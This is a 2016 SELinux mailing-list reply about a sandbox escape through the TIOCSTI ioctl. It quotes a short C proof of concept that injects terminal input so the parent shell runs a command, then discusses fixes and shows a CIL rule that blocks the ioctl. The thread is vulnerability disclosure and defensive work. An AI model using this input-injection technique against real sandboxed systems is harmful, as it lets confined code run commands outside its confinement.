Subject: Re: SELinux sandbox escape via TIOCSTI ioctl
To: Paul Moore <paul@paul-moore.com>, up201407890@alunos.dcc.fc.up.pt,
 selinux@tycho.nsa.gov, Petr Lautrbach <plautrba@redhat.com>,
 Daniel J Walsh <dwalsh@redhat.com>
References: <20160923112350.89325hv7y899lack@webmail.alunos.dcc.fc.up.pt>
 <CAHC9VhRpJQyeopPfhPOH6JSm+A0DLNXqQvW3EVY5YVymZD0qPg@mail.gmail.com>
 <7f3ff80e-b385-357d-4460-85976656ea3d@tycho.nsa.gov>
From: Stephen Smalley <sds@tycho.nsa.gov>
Message-ID: <14ec1070-b266-6d5e-b367-e09201424c70@tycho.nsa.gov>
Date: Fri, 23 Sep 2016 09:48:53 -0400
MIME-Version: 1.0
In-Reply-To: <7f3ff80e-b385-357d-4460-85976656ea3d@tycho.nsa.gov>
Content-Type: text/plain; charset=utf-8
List-Id: "Security-Enhanced Linux \(SELinux\) mailing list"
 <selinux.tycho.nsa.gov>
List-Post: <mailto:selinux@tycho.nsa.gov>
List-Help: <mailto:selinux-request@tycho.nsa.gov?subject=help>

On 09/23/2016 09:38 AM, Stephen Smalley wrote:
> On 09/23/2016 09:28 AM, Paul Moore wrote:
>> On Fri, Sep 23, 2016 at 5:23 AM,  <up201407890@alunos.dcc.fc.up.pt> wrote:
>>> Hi,
>>>
>>> When executing a program via the SELinux sandbox, the nonpriv session can
>>> escape to the parent session by using the TIOCSTI ioctl to push characters
>>> into the terminal's input buffer, allowing an attacker to escape the
>>> sandbox.
>>>
>>> $ cat test.c
>>> #include <unistd.h>
>>> #include <sys/ioctl.h>
>>>
>>> int main()
>>> {
>>>   char *cmd = "id\n";
>>>   while(*cmd)
>>>    ioctl(0, TIOCSTI, cmd++);
>>>   execlp("/bin/id", "id", NULL);
>>> }
>>>
>>> $ gcc test.c -o test
>>> $ /bin/sandbox ./test
>>> id
>>> uid=1000 gid=1000 groups=1000
>>> context=unconfined_u:unconfined_r:sandbox_t:s0:c47,c176
>>> $ id    <------ did not type this
>>> uid=1000(saken) gid=1000(saken) groups=1000(saken)
>>> context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
>>
>> I've only just started looking at this, but it seems like we need a
>> call to tcflush()/ioctl(TCFLSH) in the sandbox tool immediately after
>> the sandboxed process exits.  Do any of the userspace tools guys have
>> any other ideas?
> 
> Normally this is handled via setsid() or via a pty interposer.
> seunshare does call setsid(), so I believe that sandbox -X or -M are not
> susceptible to this, but sandbox without those options does not use
> seunshare.  run_init for example uses a pty interposer.  Another
> alternative would be to use the ioctl whitelisting support added by
> Android to block use of TIOCSTI by the sandbox domains, but it is
> unclear if that is sufficient.

So, for example, to block this via ioctl whitelisting, on a system whose
checkpolicy and kernel supports policy version 30, I can do this:
$ cat sandbox_tiocsti.cil
(allowx sandbox_domain ptynode (ioctl chr_file (not (0x5412))))
$ sudo semodule -i sandbox_tiocsti.cil
$ sandbox ./test
uid=1000 gid=1000 groups=1000
context=unconfined_u:unconfined_r:sandbox_t:s0:c466,c667

(note that we do not get the second output from the parent, and this
output was run in the context of the sandbox domain)

And we get the following AVC from the kernel:
type=AVC msg=audit(1474638454.617:6045): avc:  denied  { ioctl } for
pid=2935 comm="test" path="/dev/pts/0" dev="devpts" ino=3 ioctlcmd=5412
scontext=unconfined_u:unconfined_r:sandbox_t:s0:c72,c552
tcontext=unconfined_u:object_r:user_devpts_t:s0 tclass=chr_file permissive=0
